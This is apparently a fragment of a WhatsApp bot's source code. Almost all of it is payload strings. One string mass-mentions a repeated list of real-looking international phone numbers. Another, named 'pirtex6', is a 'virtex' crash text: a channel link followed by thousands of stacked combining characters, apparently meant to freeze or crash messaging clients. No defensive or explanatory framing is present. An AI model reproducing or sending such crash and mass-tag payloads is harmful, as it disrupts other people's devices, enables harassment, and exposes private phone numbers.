812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~*'
				pirtex6 = '𝕶𝖎𝖓𝖍`𝕷𝖚𝖎𝖘 *https://youtube.com/c/HYPERMOD* 👉 ͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽ؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒ ۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣ ͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽ؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒ ۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣ ͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽ؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒ ۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣ ͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽ؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒ ۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣ ͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽ؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒ ۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣ ͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽ؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒ ۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣ ͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽ؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒ ۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣ ͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽ؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒ ۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣ ͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽ؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒ ۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣ ͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽ؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒ ۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣ ͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽ؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒ ۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣ ͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽ؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒ ۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣ ͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽ؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒ ۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣ ͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽ؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒ ۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣ ͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽ؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒ ۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣ ͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽ؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒ ۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣۣ ͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽ؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒ 